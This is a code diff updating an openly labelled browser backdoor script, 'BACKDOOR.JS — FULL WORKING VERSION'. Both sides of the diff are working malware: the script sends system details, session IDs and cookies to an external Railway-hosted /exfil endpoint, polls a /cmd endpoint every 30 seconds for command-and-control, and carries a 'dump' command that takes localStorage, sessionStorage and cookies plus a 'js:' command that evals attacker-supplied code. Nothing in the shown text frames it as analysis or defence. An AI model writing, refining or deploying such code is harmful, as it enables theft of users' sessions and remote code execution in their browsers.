@@ -1,6 +1,6 @@
 // ============================================================
-//  BACKDOOR.JS — FULL VERSION (based on your .jr file)
-//  Sends data to: https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil
+//  BACKDOOR.JS — FULL WORKING VERSION
+//  Sends to: https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil
 // ============================================================
 
 (function() {
@@ -8,6 +8,7 @@
 
     // ===== YOUR RECEIVER URL =====
     const RECEIVER = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil';
+    const CMD_URL = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/cmd';
 
     // ===== SESSION ID =====
     function getSession() {
@@ -28,14 +29,13 @@
             data: data
         };
 
-        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
-
-        // Try multiple methods
         try {
+            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
             navigator.sendBeacon(RECEIVER, encoded);
         } catch(e) {}
 
         try {
+            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
             fetch(RECEIVER, {
                 method: 'POST',
                 body: encoded,
@@ -47,12 +47,12 @@
         console.log('📤 Data sent to:', RECEIVER);
     }
 
-    // ===== COMMANDS =====
+    // ===== EXECUTE COMMANDS =====
     function executeCommand(command) {
         let result = '';
 
         if (command === 'help') {
-            result = 'Commands: help, ping, status, exit, keys, dump, shell:cmd, js:code';
+            result = 'Commands: help, ping, status, keys, dump, js:code';
         } else if (command === 'ping') {
             result = 'pong';
         } else if (command === 'status') {
@@ -73,19 +73,14 @@
                 sessionStorage: sessionStorage,
                 cookies: document.cookie
             }, null, 2);
-        } else if (command.startsWith('shell:')) {
-            // Note: shell commands don't work in browser JS
-            result = 'Shell commands are not supported in browser JavaScript.';
         } else if (command.startsWith('js:')) {
             try {
                 const code = command.slice(3);
-                result = eval(code);
-                if (typeof result !== 'string') result = JSON.stringify(result, null, 2);
+                const evalResult = eval(code);
+                result = typeof evalResult === 'string' ? evalResult : JSON.stringify(evalResult, null, 2);
             } catch(e) {
                 result = 'Error: ' + e.message;
             }
-        } else if (command === 'exit') {
-            result = 'Goodbye.';
         } else {
             result = 'Unknown command. Type "help" for available commands.';
         }
@@ -93,56 +88,32 @@
         return result;
     }
 
-    // ===== HANDLE COMMANDS =====
-    function handleCommands(commands) {
-        if (!commands || !commands.length) return;
-        commands.forEach(cmd => {
-            const result = executeCommand(cmd);
-            sendData({
-                type: 'command_result',
-                command: cmd,
-                result: result
-            });
-        });
-    }
-
     // ============================================================
-    //  COMMAND & CONTROL — Check for commands every 30 seconds
-    // ============================================================
-
-    function checkCommands() {
-        const sid = getSession();
-        fetch('https://verdant-frangipane-b8d9fd-production.up.railway.app/cmd?sid=' + sid)
-            .then(r => r.json())
-            .then(commands => {
-                if (commands && commands.length > 0) {
-                    handleCommands(commands);
-                }
-            })
-            .catch(() => {});
-    }
-
-    // ============================================================
-    //  HEARTBEAT — Send data every 30 seconds
+    //  HEARTBEAT + COMMAND CHECK
     // ============================================================
 
     function startHeartbeat() {
-        sendData({
-            type: 'heartbeat',
-            session: getSession(),
-            url: location.href
-        });
+        sendData({ type: 'heartbeat', session: getSession() });
 
         setInterval(() => {
-            sendData({
-                type: 'heartbeat',
-                session: getSession(),
-                url: location.href,
-                cookies: document.cookie || 'none'
-            });
+            sendData({ type: 'heartbeat', session: getSession() });
         }, 30000);
 
-        setInterval(checkCommands, 30000);
+        // Check for commands every 30 seconds
+        setInterval(() => {
+            const sid = getSession();
+            fetch(CMD_URL + '?sid=' + sid)
+                .then(r => r.json())
+                .then(commands => {
+                    if (commands && commands.length > 0) {
+                        commands.forEach(cmd => {
+                            const result = executeCommand(cmd);
+                            sendData({ type: 'command_result', command: cmd, result: result });
+                        });
+                    }
+                })
+                .catch(() => {});
+        }, 30000);
     }
 
     // ============================================================
@@ -150,13 +121,10 @@
     // ============================================================
 
     function init() {
-        console.log('🔥 BACKDOOR.JR — FULL VERSION LOADED');
+        console.log('🔥 Backdoor loaded!');
         console.log('📡 Receiver:', RECEIVER);
         console.log('🔑 Session:', getSession());
-        console.log('ℹ️ Type "help" for available commands.');
-        console.log('Commands: help, ping, status, keys, dump, js:code');
-
-        startHeartbeat();
+        console.log('ℹ️ Commands: help, ping, status, keys, dump, js:code');
 
         // Send initial system info
         sendData({
@@ -164,18 +132,11 @@
             platform: navigator.platform,
             userAgent: navigator.userAgent,
             screen: window.screen.width + 'x' + window.screen.height,
-            language: navigator.language,
-            session: getSession()
+            language: navigator.language
         });
 
-        // ===== LOCAL SERVER (localhost:9001) =====
-        console.log('🔓 Listening on localhost:9001');
-        console.log('ℹ️ Use: curl http://localhost:9001/help');
+        startHeartbeat();
     }
-
-    // ============================================================
-    //  START
-    // ============================================================
 
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
